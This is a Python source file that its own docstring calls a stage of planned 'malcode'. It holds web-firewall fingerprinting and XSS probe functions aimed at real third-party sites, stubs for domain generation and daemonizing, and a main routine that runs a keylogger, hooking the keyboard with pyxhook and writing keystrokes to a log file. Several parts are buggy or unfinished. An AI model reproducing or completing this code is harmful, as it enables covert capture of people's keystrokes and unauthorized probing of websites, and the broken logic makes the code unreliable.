"""
Module made for checking web firewall a stage of the malcode that is going to be written also includes fuzzing
!Note check_if_no_wap_http_method not done yet still under work
!also inspired only in check_cookies from wafw00f.py for the cases of cookie headers
go check it out : https://github.com/EnableSecurity/wafw00f
"""

import requests
import re
import sys
import time
from urllib.error import HTTPError
from urllib.request import urlopen
sys.path.append("../")
from lib_special import pyxhook



def check_if_no_wap_http_method(url,url2):
    target = url
    result = urlopen(target)
    if result.getcode() == 200:
        payload = {"query":"<script>alert()</script>"}
        new_result = requests.get(target,payload)
        if new_result.status_code == 200:
            if "<script>alert()</script>" in new_result.text:
                print("u are vulnerable")
            else:
                print("Exploit doesnt exists")
    target2 = url2
    result2 = urlopen(target2)
    if result2.getcode() == 200:
        new_payload = {"PageID=99>\"": "<script>alert();</script>"}
        new2_result = requests.get(target, new_payload)
        if new2_result.status_code == 404:
            print("found wap ")


    else:
        print("ERRor while connecting to the website")

def check_cookie(url):
    import os
    target = url
    result = urlopen(target)
    if result.getcode() == 200:
        if re.findall("(.ns_)+",str(result.info())):
            print("found firewall 1")
            os.system(exit(0))
        elif re.findall("^(Cneonction: close)+",str(result.info())):
            print("found firewall 2")
            os.system(exit(0))
        elif re.findall("^(Cneonction: close)+",str(result.info())):
            print("found firewall 3")
            os.system(exit(0))
        else:
            print("no firewall detected Citrix Netscaler")
            os.system(exit(0))

        if re.findall("^TS[a-zA-Z0-9]{3,6}",str(result.info())):
            print("found F5 Big IP ASM")
        else:
            print("no firewall detected F5 Big IP ASM")
        if re.compile(("^ASISINFO=|cookie|server|F5-TrafficShield"),str(result.info)):
            print("found F5 Big IP traffic shield")
        else:
            print("no traffic shield detected")



def generate_domain_names():
    #must be implemented
    pass

def key_handler(event):
    keylogs = chr(event.Ascii)
    f = open("../log/log.txt","w+")
    while re.search(r'([a-z])(.*)\1', keylogs):
        s = re.sub(r'([a-z])(.*)\1', r'\1\2', keylogs)
        f.write(s+'\n')
        #sys.stdout.write(s)
    #sys.stdout.flush()
    f.close()


def daemonize():
    pass


def spanwn():
    pass

#check_if_no_wap_http_method("https://www.citrix.com/","http://aqtronix.com/?")
#check_cookie("http://www.citrix.org/")


def main():
    hookman = pyxhook.HookManager()

    hookman.KeyDown = key_handler

    hookman.HookKeyboard()
    hookman.start()
    running = True
    while running:
        time.sleep(0.1)

main()



